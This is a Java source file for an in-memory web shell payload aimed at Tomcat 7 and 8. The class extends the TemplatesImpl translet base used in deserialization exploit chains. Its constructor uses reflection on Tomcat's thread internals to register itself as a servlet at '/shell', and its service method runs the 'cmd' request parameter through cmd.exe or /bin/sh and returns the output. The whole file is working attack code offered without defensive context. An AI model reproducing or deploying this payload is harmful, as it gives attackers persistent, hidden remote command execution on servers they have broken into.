package test;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Scanner;

import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardHost;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class TemplatesImplTomcat78ServletShell extends AbstractTranslet implements  Servlet{
    String uriMB;
    String serverNameMB;
    public TemplatesImplTomcat78ServletShell() throws Exception {
    	setMB();
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
                if (!t.getName().contains("StandardEngine")) continue;
                Object target = getFieldValue(t, "target");
                if (target == null) continue;
                HashMap children;
                Object obj = getFieldValue(target, "this$0");
                children = (HashMap) getFieldValue(obj, "children");
                
                StandardHost standardHost = (StandardHost) children.get(serverNameMB);
                children = (HashMap) getFieldValue(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(uriMB.startsWith(contextKey))) continue;
					StandardContext standardContext = (StandardContext) children.get(contextKey);
			        Wrapper wrapper = standardContext.createWrapper();
			        wrapper.setName("shell");
			        wrapper.setServlet(this);
			        standardContext.addChild(wrapper);
			        try {
			        	Method addServlet = StandardContext.class.getMethod("addServletMappingDecoded", String.class, String.class);
			        	addServlet.invoke(standardContext, "/shell", "shell");
			        }catch (Exception e) {
			        	Method addServlet = StandardContext.class.getMethod("addServletMapping", String.class, String.class);
			        	addServlet.invoke(standardContext, "/shell", "shell");
					}
                }
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
    }
    private void setMB() throws Exception {
    	boolean flag = false;
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "global");
    	        ArrayList processors = (ArrayList) getFieldValue(obj, "processors");
    	        for(int j = 0; j < processors.size(); ++j) {
    	            Object processor = processors.get(j);
    	            Object req = getFieldValue(processor, "req");
    	            Object serverPort = getFieldValue(req, "serverPort");
                    if (serverPort.equals(-1)) continue;
    	            serverNameMB = (String) getFieldValue(req, "serverNameMB").toString();
    	            uriMB = (String) getFieldValue(req, "uriMB").toString();
    	            if(serverNameMB != null && uriMB != null) {
    	            	flag = true;
    	            }
    	            if (flag)  break;
    	        }
    	        if (flag)  break;
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
		
	}
	@Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
    	Field field;
    	try {
    		field = obj.getClass().getDeclaredField(fieldName);
		} catch (Exception e) {
			try {
				field = obj.getClass().getSuperclass().getDeclaredField(fieldName);
			} catch (Exception e2) {
				field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(fieldName);
			}
		}
        field.setAccessible(true);
        return field.get(obj);
    }
	@Override
	public void init(ServletConfig config) throws ServletException {
	}
	@Override
	public ServletConfig getServletConfig() {
		return null;
	}
	@Override
    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
        String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
		String output = s.hasNext() ? s.next() : "";
        PrintWriter out = response.getWriter();
        response.getWriter().write(output);
        response.getWriter().flush();
    }
	@Override
	public String getServletInfo() {
		return null;
	}
	@Override
	public void destroy() {
	}
}
